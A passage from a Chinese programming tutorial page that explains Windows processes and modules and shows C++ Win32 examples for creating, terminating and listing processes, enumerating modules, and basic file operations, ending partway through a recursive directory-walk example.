什么是进程？"></a>一、 什么是进程？</h3><p>进程可以看作是一个运行中的程序，应该由一个可执行程序(.exe)产生。一个进程最少包含了一个进程内核对象、一个线程内核对象（执行代码）、一块虚拟地址空间(4GB)、需要用到的数据和代码（模块）</p><h3 id="二、什么是模块？"><a href="#二、什么是模块？" class="headerlink" title="二、什么是模块？"></a>二、什么是模块？</h3><p>windows下的可执行文件（.dll   .exe）通常被称作模块，用于提供必须的数据以及代码。</p><p>在 VS 中: 程序断下来后 -&gt; 菜单 -&gt; 调试 -&gt; 窗口 -&gt; 模块</p><h3 id="三、-退出进程的方式"><a href="#三、-退出进程的方式" class="headerlink" title="三、 退出进程的方式"></a>三、 退出进程的方式</h3><ol><li><strong>通过main()\WinMain() 主动的进程退出</strong></li><li>通过 ExitProcess 函数退出</li><li>通过 TerminateProcess 函数强制结束</li></ol><h2 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h2><h3 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个进程</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 用于存放被创建进程的进程句柄、主线程句柄和pid以及tid</span></span><br><span class="line">PROCESS_INFORMATION ProcessInfomation = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于设置进程的启动信息(结构体的首字段如果是 cb 或者 dwSize 就初始化)</span></span><br><span class="line">STARTUPINFO StartupInfo = &#123; <span class="keyword">sizeof</span>(STARTUPINFO) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建进程的函数</span></span><br><span class="line">CreateProcess(</span><br><span class="line"><span class="string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>,<span class="comment">// 参数1: 需要创建的进程对应的exe文件</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 参数2: 指定应用程序使用到的参数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>,<span class="comment">// 参数3，参数4: 进程内核对象和线程内核对象的安全属性</span></span><br><span class="line">FALSE,<span class="comment">// 参数5: 子进程是否继承父进程的句柄，只有允许继承的句柄才会被继承</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 参数6: 创建标志 CREATE_NEW_CONSOLE，使用两个控制台</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 参数7: 环境变量</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 参数8: 工作路径</span></span><br><span class="line">&amp;StartupInfo,</span><br><span class="line">&amp;ProcessInfomation</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通常需要关闭句柄,这里关闭不会销毁内核对象</span></span><br><span class="line">CloseHandle(ProcessInfomation.hThread);</span><br><span class="line">CloseHandle(ProcessInfomation.hProcess);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以使用 WinExec ShellExecute system 等创建进程</span></span><br><span class="line">system(<span class="string">&quot;start notepad.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="操作进程"><a href="#操作进程" class="headerlink" title="操作进程"></a>操作进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 操作进程需要用到进程的句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以通过 FindWindow 找到窗口句柄</span></span><br><span class="line">HWND hWnd = FindWindow(<span class="literal">NULL</span>, <span class="string">L&quot;无标题 - 记事本&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以通过窗口句柄获取到进程ID</span></span><br><span class="line">DWORD Pid = <span class="number">0</span>;</span><br><span class="line">GetWindowThreadProcessId(hWnd, &amp;Pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以使用 PID 获取到进程的句柄</span></span><br><span class="line">HANDLE Process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过句柄来结束一个指定进程</span></span><br><span class="line">TerminateProcess(Process, <span class="number">-1</span>);</span><br><span class="line">CloseHandle(Process);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结束当前的进程，不推荐使用</span></span><br><span class="line">ExitProcess(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历进程"><a href="#遍历进程" class="headerlink" title="遍历进程"></a>遍历进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程快照  +   EnumProcess</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 包含需要用到的头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 什么是快照? 将调用函数的【那一刻】操作系统的进程状态记录下来</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">wstring</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个快照用于遍历进程，参数2可以留空</span></span><br><span class="line">HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建一个用于保存进程信息的结构体</span></span><br><span class="line">PROCESSENTRY32 ProcessInfo = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 尝试遍历第一个进程的信息，成功就继续，失败就跳过</span></span><br><span class="line"><span class="keyword">if</span> (Process32First(Snapshot, &amp;ProcessInfo))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 5. 输出遍历到的进程的信息: 使用 %ls 可以输出宽字符</span></span><br><span class="line">buffer += ProcessInfo.szExeFile;</span><br><span class="line">buffer += <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">typedef struct tagPROCESSENTRY32W</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">DWORD   th32ProcessID;          // 进程的ID</span></span><br><span class="line"><span class="comment">DWORD   cntThreads;// 拥有的线程总数</span></span><br><span class="line"><span class="comment">DWORD   th32ParentProcessID;    // 所属进程的ID</span></span><br><span class="line"><span class="comment">DWORD   dwFlags;// 标志</span></span><br><span class="line"><span class="comment">WCHAR   szExeFile[MAX_PATH];    // 进程的名称</span></span><br><span class="line"><span class="comment">&#125; PROCESSENTRY32W;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取进程对应exe所在的路径</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 5.5.1 用于保存进程路径的缓冲区和大小</span></span><br><span class="line">DWORD PathSize = MAX_PATH;</span><br><span class="line">WCHAR ImagePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.5.2 通过指定的权限获取进程句柄</span></span><br><span class="line">HANDLE Process = OpenProcess(PROCESS_QUERY_INFORMATION,</span><br><span class="line">FALSE, ProcessInfo.th32ProcessID);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.5.3 通过API查询到进程对应的Exe的路径，获取不到是因为权限不够</span></span><br><span class="line">QueryFullProcessImageName(Process, <span class="number">0</span>, ImagePath, &amp;PathSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.5.4 关闭句柄并打印数据</span></span><br><span class="line">CloseHandle(Process);</span><br><span class="line"><span class="comment">// printf(&quot;\t%ls\n&quot;, ImagePath);</span></span><br><span class="line">buffer += <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">buffer += ImagePath;</span><br><span class="line">buffer += <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 尝试遍历进程快照内的下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(Snapshot, &amp;ProcessInfo));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果进行快速的输出: 减少输出函数的调用，</span></span><br><span class="line"><span class="comment">// 一般会对想要输出的内容进行拼接，再统一的调用一次函数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ls\n&quot;</span>, buffer.c_str());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历模块"><a href="#遍历模块" class="headerlink" title="遍历模块"></a>遍历模块</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 包含需要用到的头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 2. 创建一个快照用于遍历模块，参数2是指定的进程ID</span></span><br><span class="line"><span class="comment">//    [记得修改第一个参数为 TH32CS_SNAPMODULE]</span></span><br><span class="line">HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, <span class="number">10536</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建一个用于保存模块信息的结构体</span></span><br><span class="line">MODULEENTRY32 ModuleInfo = &#123; <span class="keyword">sizeof</span>(MODULEENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 尝试遍历第一个模块的信息，成功就继续，失败就跳过</span></span><br><span class="line"><span class="keyword">if</span> (Module32First(Snapshot, &amp;ModuleInfo))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 5. 输出遍历到的模块的信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ls\n&quot;</span>, ModuleInfo.szExePath);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">typedef struct tagMODULEENTRY32W</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">DWORD   th32ProcessID;      // 所属进程ID</span></span><br><span class="line"><span class="comment">BYTE  * modBaseAddr;        // 模块的加载基地址</span></span><br><span class="line"><span class="comment">DWORD   modBaseSize;        // 模块的大小</span></span><br><span class="line"><span class="comment">HMODULE hModule;            // 模块的句柄(加载基址)</span></span><br><span class="line"><span class="comment">WCHAR   szModule[MAX_MODULE_NAME32 + 1];// 模块名</span></span><br><span class="line"><span class="comment">WCHAR   szExePath[MAX_PATH];// 所在路径</span></span><br><span class="line"><span class="comment">&#125; MODULEENTRY32W;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 尝试遍历模块快照内的下一个模块</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Module32Next(Snapshot, &amp;ModuleInfo));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="无句柄"><a href="#无句柄" class="headerlink" title="无句柄"></a>无句柄</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 删除指定文件和目录: 文件路径，不能乱用</span></span><br><span class="line"><span class="comment">// DeleteFile(L&quot;E:\\123.txt&quot;);</span></span><br><span class="line">RemoveDirectory(<span class="string">L&quot;E:\\123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 复制文件到某一个地方，最后一个参数为FALSE表示覆盖已有文件</span></span><br><span class="line"><span class="comment">// CopyFile(L&quot;E:\\123.txt&quot;, L&quot;E:\\123\\456.txt&quot;, FALSE);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 移动文件(重命名)</span></span><br><span class="line"><span class="comment">// MoveFile(L&quot;E:\\123.txt&quot;, L&quot;E:\\456.txt&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 获取文件的信息(属性\时间\大小)</span></span><br><span class="line"><span class="comment">// 使用非 Ex 版本可以只获取文件的属性</span></span><br><span class="line">WIN32_FILE_ATTRIBUTE_DATA FileInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetFileAttributesEx(<span class="string">L&quot;E:\\新建文件夹&quot;</span>,</span><br><span class="line">GetFileExInfoStandard, &amp;FileInfo);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FileTimeToLocalFileTime + FileTimeToSystemTime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取的时间是格林威治时间，需要转换成本地时间</span></span><br><span class="line">FILETIME LocalTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FileTimeToLocalFileTime(&amp;FileInfo.ftCreationTime, &amp;LocalTime);</span><br><span class="line"><span class="comment">// 转换时间: 将文件时间转换为系统时间</span></span><br><span class="line">SYSTEMTIME System = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FileTimeToSystemTime(&amp;LocalTime, &amp;System);</span><br><span class="line"><span class="comment">/////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断一个文件是否拥有某一种属性, dwFileAttributes 每一位代表了</span></span><br><span class="line"><span class="comment">// 一种属性，如果拥有这种属性，对应的就为 1</span></span><br><span class="line"><span class="keyword">if</span> (FileInfo.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目录 &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件 &quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, FileInfo.dwFileAttributes &amp; FILE_ATTRIBUTE_HIDDEN ? <span class="string">&quot;隐藏&quot;</span> : <span class="string">&quot;显示&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="有句柄"><a href="#有句柄" class="headerlink" title="有句柄"></a>有句柄</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用句柄操作的一些方式</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 创建一个文件</span></span><br><span class="line">HANDLE Handle = CreateFileA(</span><br><span class="line"> <span class="string">&quot;E:\\abc.txt&quot;</span>,<span class="comment">// 文件的位置</span></span><br><span class="line"> GENERIC_ALL,<span class="comment">// 文件的属性</span></span><br><span class="line"> <span class="literal">NULL</span>,<span class="comment">// 共享方式  FILE_SHARE_READ</span></span><br><span class="line"> <span class="literal">NULL</span>,<span class="comment">// 安全描述符</span></span><br><span class="line"> CREATE_ALWAYS,<span class="comment">// 不管是否存在都创建</span></span><br><span class="line"> FILE_ATTRIBUTE_NORMAL,<span class="comment">// 默认属性</span></span><br><span class="line"> <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 打开一个文件，文件打开失败会返回 INVALID_HANDLE_VALUE(-1)</span></span><br><span class="line">HANDLE Handle = CreateFileA(</span><br><span class="line"> <span class="string">&quot;E:\\abc.txt&quot;</span>,<span class="comment">// 文件的位置</span></span><br><span class="line"> GENERIC_ALL,<span class="comment">// 文件的属性</span></span><br><span class="line"> <span class="literal">NULL</span>,<span class="comment">// 共享方式</span></span><br><span class="line"> <span class="literal">NULL</span>,<span class="comment">// 安全描述符</span></span><br><span class="line"> OPEN_EXISTING,<span class="comment">// 存在才打开</span></span><br><span class="line"> FILE_ATTRIBUTE_NORMAL,<span class="comment">// 默认属性</span></span><br><span class="line"> <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入数据</span></span><br><span class="line">DWORD RealWrite = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 参数1： 想要操作的文件句柄</span></span><br><span class="line"><span class="comment">// 参数2： 想要写入的数据所在的位置</span></span><br><span class="line"><span class="comment">// 参数3： 想要写入数据的长度</span></span><br><span class="line"><span class="comment">// 参数4： 实际写入的数据的长度</span></span><br><span class="line">WriteFile(Handle, <span class="string">&quot;123456&quot;</span>, <span class="number">3</span>, &amp;RealWrite, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文件指针到起始位置</span></span><br><span class="line">SetFilePointer(Handle, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line">DWORD Current = SetFilePointer(Handle, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_CURRENT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line"><span class="comment">// 参数1： 想要操作的文件句柄</span></span><br><span class="line"><span class="comment">// 参数2： 想要将数据读取到哪里</span></span><br><span class="line"><span class="comment">// 参数3： 想要读取多少字节的数据</span></span><br><span class="line"><span class="comment">// 参数4： 实际读取的数据的长度</span></span><br><span class="line">DWORD RealRead = <span class="number">0</span>;</span><br><span class="line">CHAR Buffer[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ReadFile(Handle, Buffer, <span class="number">3</span>, &amp;RealRead, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文件的结束位置</span></span><br><span class="line">SetFilePointer(Handle, <span class="number">2</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line">SetEndOfFile(Handle);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件的大小,参数2是文件大小的高位，不适用可以填充NULL</span></span><br><span class="line">LARGE_INTEGER size;</span><br><span class="line">size.LowPart = GetFileSize(Handle, (LPDWORD)&amp;size.HighPart);</span><br><span class="line"><span class="comment">// size.QuadPart 这个就是文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h4><h5 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归遍历目录下的所有文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnumFile</span><span class="params">(LPCSTR DirPath, <span class="keyword">int</span> level)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 拼接字符串: 目录 + \\*，* 是通配符表示要查找任何类型的文件</span></span><br><span class="line">CHAR Path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(Path, <span class="string">&quot;%s\\*&quot;</span>, DirPath);<span class="comment">// strcat(Path, &quot;\\*&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.  保存文件信息的结构体</span></span><br><span class="line">WIN32_FIND_DATAA FindData = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 尝试遍历第一个文件</span></span><br><span class="line">HANDLE FindHandle = FindFirstFileA(Path, &amp;FindData);</span><br><span class="line"></span><br><span class="line"><span 